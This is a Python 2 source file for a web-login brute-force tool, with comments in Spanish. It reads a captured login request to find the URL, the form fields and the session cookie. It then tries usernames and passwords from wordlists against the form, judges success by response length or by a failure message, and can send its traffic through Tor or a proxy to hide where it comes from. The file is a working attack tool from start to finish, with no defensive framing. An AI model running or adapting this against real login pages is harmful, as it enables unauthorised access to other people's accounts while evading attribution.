#!/usr/bin/python
 
import re # Utilizado para regex
import sys
import time
import requests #Utilizado para realizar las peticiones
import os.path
from termcolor import colored
import socket # Tor
import socks # Tor

def checkFile(reqFile,user,pwd,userFile,passFile,message,verbose,cookie,agent,proxip,proxport,tor,report):
	
	b = ['','1','12']
	a = []
	proxy = proxip  + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	
	print colored("\nBeginning BruteForce with Request File", 'cyan')
	if os.path.exists(reqFile):
		fo = open(reqFile,'r')
		for line in fo:
			regex = re.compile(r'Referer\: (.*)') # Obtiene el enlace del login
			match = regex.search(line)
			try:
				if match.group():
					url = match.group(1)
			except:		
				regex = re.compile(r'(.*=&)(.*)(=(.*)\&)(.*)(\=)(.*)') # Obtiene los campos del login
				match = regex.search(line)
				try:
					if match.group():
						userField = match.group(2)
						passField = match.group(5)
				except:
					continue
		fo.close()
	
	requests.packages.urllib3.disable_warnings()
	if len(proxy) == 1:
		if tor == True: # Peticiones a traves de Tor
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
			req = requests.get(url,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
		else:
			req = requests.get(url,verify=False)
	else: # Peticiones a traves del proxy
		try:
			req = requests.get(url,proxies = proxies,verify=False)
		except requests.exceptions.ConnectionError:
			print 'There\'s a problem with the proxy connection, please check it and try again :D '
			sys.exit(2)
	
	if cookie is None: # Obtencion de cookie de sesion
		for key,value in req.headers.iteritems():
			if 'set-cookie' in key:
				regex = re.compile(r'(OJSSID=)((.*);)')
				match = regex.search(value)
				try:
					if match.group():
						cookie = re.sub(r';(.*)','',match.group(2))
				except:
						regex = re.compile(r'((.*)=)((.*);)')
						match = regex.search(value)
						try:
							if match.group():
								cookie = re.sub(r';(.*)','',match.group(3))
						except:
							print 'nio'
	
	else:
		pass
		
	if agent is None:
		agent = 'Kakeando'
	else:
		pass
	
	
	requests.packages.urllib3.disable_warnings()	
	for element in b: # Se realizan las peticiones para validar que parametros regresa el sitio
		payload = {userField : element, passField: ''}
		headers = {'user-agent': agent}
		cookies = {'': cookie} 
		if len(proxy) == 1:
			if tor == True:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
				socket.socket = socks.socksocket
				proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
				req = requests.post(url,payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
			else:
				req = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
		else:
			req = requests.post(url,cookies = cookies, headers = headers,proxies = proxies,verify=False)
		a.append(len(req.content))
	
	if user == '' and pwd == '': # Si se envian dos archivos
		doubleFile(url,userField,passField,user,pwd,userFile,passFile,message,verbose,cookie,agent,proxy,proxies,a,tor,report)
		
	elif user == '' and passFile == '': # Si se enviaun archivo con passwords
		usersFile(url,userField,passField,user,pwd,userFile,passFile,message,verbose,cookie,agent,proxy,proxies,a,tor,report)
	
	elif userFile == '' and pwd == '': # Si se envia un arvhico con usuarios
		pwdFile(url, userField, passField, user, pwd, userFile, passFile, message,verbose,cookie,agent,proxy,proxies,a,tor,report)
		
	elif userFile == '' and passFile == '': # Si no se envian archivos
		single(url,userField,passField,user,pwd,userFile,passFile,message,verbose,cookie,agent,proxy,proxies,a,tor,report)
			


def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report): # Sin archivos
	l = []
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
	
		
	payload = { userField : user, passField: pwd} # Carga del payload
	
	headers = {'user-agent': agent}
	cookies = {'': cookie} 
	if len(proxy) == 1:
		if tor == True:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
		else:
			r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
	else:
		r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
	
	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	
	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
		if int(len(r.content)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	rep(report,l)

def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report):
	users = []
	l = []
	requests.packages.urllib3.disable_warnings()		
	
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
			headers = {'user-agent': agent}
			cookies = {'': cookie} 
			if len(proxy) == 1:
				if tor == True:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket
					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
					r = requests.post(url, data = payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
				else:
					r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
			else:
				r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
			
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	
	
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] or mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack with ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	rep(report,l)	

def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list, tor,report):
	
	passwords = []
	l = []
	requests.packages.urllib3.disable_warnings()		
	
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')} # Carga del payload
			headers = {'user-agent': agent}
			cookies = {'': cookie} 
			if len(proxy) == 1:
				if tor == True:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket 
					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
					r = requests.post(url,data = payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
				else:
					r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
			else:
				r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
		
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
			
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
	rep(report,l)

def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxy,proxies,list,tor,report):
	l = []
	users = []
	passwords = []
	i = 0
	j = 0
	requests.packages.urllib3.disable_warnings()		
	
	
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				headers = {'user-agent': agent}
				cookies = {'': cookie} 
				if len(proxy) == 1:
					if tor == True:
						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
						socket.socket = socks.socksocket
						proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
						r = requests.post(url,data = payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
					else:
						r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
				else:
					r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
					
				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
						
				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
					if int(len(r.content)) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
		i + 1	
	rep(report,l)

def rep(list1,list2):
	for value in list1:
		if list1.index(value) == 0:
			t = time.strftime('%d-%m-%Y')
			h = time.strftime('%H:%M:%S')
			fo = open(('BruteForceReport_' + t + '_'+ h + '.txt'), 'wb')
			fo.write('Results from the site\n')
			for element in list2:
				fo.write(element + '\n')
			fo.close()
		else:
			pass
